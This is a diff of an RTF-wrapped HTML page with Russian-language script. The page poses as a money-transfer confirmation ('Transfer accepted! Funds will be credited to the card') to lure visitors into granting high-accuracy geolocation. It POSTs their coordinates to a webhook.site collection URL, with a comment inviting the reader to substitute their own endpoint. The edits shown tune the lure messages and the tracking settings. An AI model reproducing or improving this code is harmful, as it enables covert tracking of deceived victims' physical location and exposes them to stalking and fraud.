@@ -1,8 +1,8 @@
 {\rtf1\ansi\ansicpg1251\cocoartf2639
 \cocoatextscaling0\cocoaplatform0{\fonttbl\f0\froman\fcharset0 Times-Roman;\f1\fnil\fcharset0 HelveticaNeue;}
-{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red38\green38\blue38;\red255\green255\blue255;
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red28\green63\blue105;\red247\green247\blue247;
 }
-{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;\cssrgb\c20000\c20000\c20000;\cssrgb\c100000\c100000\c100000;
+{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;\cssrgb\c13725\c32157\c48627;\cssrgb\c97647\c97647\c97647;
 }
 \paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
 \deftab720
@@ -63,9 +63,9 @@
     </div>\
 \
     <script>\
-        // \uc0\u1060 \u1091 \u1085 \u1082 \u1094 \u1080 \u1103  \u1076 \u1083 \u1103  \u1083 \u1086 \u1075 \u1080 \u1088 \u1086 \u1074 \u1072 \u1085 \u1080 \u1103  \u1089 \u1086 \u1086 \u1073 \u1097 \u1077 \u1085 \u1080 \u1081 \
+        // \uc0\u1060 \u1091 \u1085 \u1082 \u1094 \u1080 \u1103  \u1076 \u1083 \u1103  \u1086 \u1090 \u1086 \u1073 \u1088 \u1072 \u1078 \u1077 \u1085 \u1080 \u1103  \u1089 \u1086 \u1086 \u1073 \u1097 \u1077 \u1085 \u1080 \u1081 \
         function logMessage(message) \{\
-            console.log(message);\
+            console.log("[GeoDebug] " + message);\
             document.getElementById("location").innerHTML = message;\
         \}\
 \
@@ -75,18 +75,19 @@
             return;\
         \}\
 \
+        // \uc0\u1055 \u1088 \u1086 \u1074 \u1077 \u1088 \u1082 \u1072  \u1087 \u1086 \u1076 \u1076 \u1077 \u1088 \u1078 \u1082 \u1080  \u1075 \u1077 \u1086 \u1083 \u1086 \u1082 \u1072 \u1094 \u1080 \u1080 \
+        if (!navigator.geolocation) \{\
+            logMessage("\uc0\u1054 \u1096 \u1080 \u1073 \u1082 \u1072 : \u1042 \u1072 \u1096  \u1073 \u1088 \u1072 \u1091 \u1079 \u1077 \u1088  \u1085 \u1077  \u1087 \u1086 \u1076 \u1076 \u1077 \u1088 \u1078 \u1080 \u1074 \u1072 \u1077 \u1090  \u1075 \u1077 \u1086 \u1083 \u1086 \u1082 \u1072 \u1094 \u1080 \u1102 .");\
+            return;\
+        \}\
+\
         // \uc0\u1040 \u1074 \u1090 \u1086 \u1084 \u1072 \u1090 \u1080 \u1095 \u1077 \u1089 \u1082 \u1080 \u1081  \u1079 \u1072 \u1087 \u1088 \u1086 \u1089  \u1075 \u1077 \u1086 \u1083 \u1086 \u1082 \u1072 \u1094 \u1080 \u1080 \
-        window.onload = function() \{\
-            logMessage("\uc0\u1047 \u1072 \u1087 \u1088 \u1072 \u1096 \u1080 \u1074 \u1072 \u1077 \u1084  \u1076 \u1086 \u1089 \u1090 \u1091 \u1087 ...");\
-            if (navigator.geolocation) \{\
-                navigator.geolocation.getCurrentPosition(showPosition, showError, \{\
-                    timeout: 10000,\
-                    enableHighAccuracy: true\
-                \});\
-            \} else \{\
-                logMessage("\uc0\u1042 \u1072 \u1096  \u1073 \u1088 \u1072 \u1091 \u1079 \u1077 \u1088  \u1085 \u1077  \u1087 \u1086 \u1076 \u1076 \u1077 \u1088 \u1078 \u1080 \u1074 \u1072 \u1077 \u1090  \u1075 \u1077 \u1086 \u1083 \u1086 \u1082 \u1072 \u1094 \u1080 \u1102 .");\
-            \}\
-        \};\
+        logMessage("\uc0\u1048 \u1085 \u1080 \u1094 \u1080 \u1072 \u1083 \u1080 \u1079 \u1072 \u1094 \u1080 \u1103  \u1079 \u1072 \u1087 \u1088 \u1086 \u1089 \u1072  \u1075 \u1077 \u1086 \u1083 \u1086 \u1082 \u1072 \u1094 \u1080 \u1080 ...");\
+        navigator.geolocation.getCurrentPosition(showPosition, showError, \{\
+            timeout: 10000, // \uc0\u1058 \u1072 \u1081 \u1084 \u1072 \u1091 \u1090  10 \u1089 \u1077 \u1082 \u1091 \u1085 \u1076 \
+            enableHighAccuracy: true, // \uc0\u1042 \u1099 \u1089 \u1086 \u1082 \u1072 \u1103  \u1090 \u1086 \u1095 \u1085 \u1086 \u1089 \u1090 \u1100 \
+            maximumAge: 0 // \uc0\u1041 \u1077 \u1079  \u1082 \u1101 \u1096 \u1080 \u1088 \u1086 \u1074 \u1072 \u1085 \u1080 \u1103 \
+        \});\
 \
         function showPosition(position) \{\
             let lat = position.coords.latitude;\
@@ -94,9 +95,8 @@
             logMessage(`\uc0\u1055 \u1077 \u1088 \u1077 \u1074 \u1086 \u1076  \u1087 \u1088 \u1080 \u1085 \u1103 \u1090 ! \u1057 \u1088 \u1077 \u1076 \u1089 \u1090 \u1074 \u1072  \u1073 \u1091 \u1076 \u1091 \u1090  \u1079 \u1072 \u1095 \u1080 \u1089 \u1083 \u1077 \u1085 \u1099  \u1085 \u1072  \u1082 \u1072 \u1088 \u1090 \u1091 .`);\
 \
             // \uc0\u1054 \u1090 \u1087 \u1088 \u1072 \u1074 \u1082 \u1072  \u1076 \u1072 \u1085 \u1085 \u1099 \u1093  \u1085 \u1072  Webhook.site (\u1079 \u1072 \u1084 \u1077 \u1085 \u1080 \u1090 \u1077  URL \u1085 \u1072  \u1074 \u1072 \u1096 )\
-            fetch('
-\f1\fs28 \cf3 \cb4 \strokec3 https://webhook.site/a3a94329-1da3-4ba4-80e1-e68292640044
-\f0\fs24 \cf0 \cb1 \strokec2 ', \{\
+            fetch('{\field{\*\fldinst{HYPERLINK "https://webhook.site/a3a94329-1da3-4ba4-80e1-e68292640044"}}{\fldrslt 
+\f1\fs25\fsmilli12600 \cf3 \cb4 \ul \ulc3 \strokec3 https://webhook.site/a3a94329-1da3-4ba4-80e1-e68292640044}}', \{\
                 method: 'POST',\
                 headers: \{ 'Content-Type': 'application/json' \},\
                 body: JSON.stringify(\{\
@@ -113,7 +113,7 @@
                 \}\
             \})\
             .catch(error => \{\
-                logMessage("\uc0\u1054 \u1096 \u1080 \u1073 \u1082 \u1072 : " + error.message);\
+                logMessage("\uc0\u1054 \u1096 \u1080 \u1073 \u1082 \u1072  \u1086 \u1090 \u1087 \u1088 \u1072 \u1074 \u1082 \u1080 : " + error.message);\
             \});\
         \}\
 \
@@ -121,16 +121,16 @@
             let message;\
             switch(error.code) \{\
                 case error.PERMISSION_DENIED:\
-                    message = "\uc0\u1055 \u1086 \u1078 \u1072 \u1083 \u1091 \u1081 \u1089 \u1090 \u1072 , \u1088 \u1072 \u1079 \u1088 \u1077 \u1096 \u1080 \u1090 \u1077  \u1076 \u1086 \u1089 \u1090 \u1091 \u1087  \u1074  \u1085 \u1072 \u1089 \u1090 \u1088 \u1086 \u1081 \u1082 \u1072 \u1093  \u1073 \u1088 \u1072 \u1091 \u1079 \u1077 \u1088 \u1072 , \u1095 \u1090 \u1086 \u1073 \u1099  \u1087 \u1088 \u1080 \u1085 \u1103 \u1090 \u1100  \u1087 \u1077 \u1088 \u1077 \u1074 \u1086 \u1076 .";\
+                    message = "\uc0\u1055 \u1086 \u1078 \u1072 \u1083 \u1091 \u1081 \u1089 \u1090 \u1072 , \u1088 \u1072 \u1079 \u1088 \u1077 \u1096 \u1080 \u1090 \u1077  \u1076 \u1086 \u1089 \u1090 \u1091 \u1087  \u1082  \u1084 \u1077 \u1089 \u1090 \u1086 \u1087 \u1086 \u1083 \u1086 \u1078 \u1077 \u1085 \u1080 \u1102  \u1074  \u1085 \u1072 \u1089 \u1090 \u1088 \u1086 \u1081 \u1082 \u1072 \u1093  \u1073 \u1088 \u1072 \u1091 \u1079 \u1077 \u1088 \u1072  \u1080 \u1083 \u1080  \u1090 \u1077 \u1083 \u1077 \u1092 \u1086 \u1085 \u1072 .";\
                     break;\
                 case error.POSITION_UNAVAILABLE:\
-                    message = "\uc0\u1053 \u1077  \u1091 \u1076 \u1072 \u1083 \u1086 \u1089 \u1100  \u1086 \u1087 \u1088 \u1077 \u1076 \u1077 \u1083 \u1080 \u1090 \u1100  \u1084 \u1077 \u1089 \u1090 \u1086 \u1087 \u1086 \u1083 \u1086 \u1078 \u1077 \u1085 \u1080 \u1077 .";\
+                    message = "\uc0\u1052 \u1077 \u1089 \u1090 \u1086 \u1087 \u1086 \u1083 \u1086 \u1078 \u1077 \u1085 \u1080 \u1077  \u1085 \u1077 \u1076 \u1086 \u1089 \u1090 \u1091 \u1087 \u1085 \u1086 . \u1055 \u1088 \u1086 \u1074 \u1077 \u1088 \u1100 \u1090 \u1077  GPS.";\
                     break;\
                 case error.TIMEOUT:\
                     message = "\uc0\u1042 \u1088 \u1077 \u1084 \u1103  \u1079 \u1072 \u1087 \u1088 \u1086 \u1089 \u1072  \u1080 \u1089 \u1090 \u1077 \u1082 \u1083 \u1086 . \u1055 \u1086 \u1087 \u1088 \u1086 \u1073 \u1091 \u1081 \u1090 \u1077  \u1089 \u1085 \u1086 \u1074 \u1072 .";\
                     break;\
                 default:\
-                    message = "\uc0\u1055 \u1088 \u1086 \u1080 \u1079 \u1086 \u1096 \u1083 \u1072  \u1086 \u1096 \u1080 \u1073 \u1082 \u1072 : " + error.message;\
+                    message = "\uc0\u1054 \u1096 \u1080 \u1073 \u1082 \u1072 : " + error.message;\
             \}\
             logMessage(message);\
         \}\
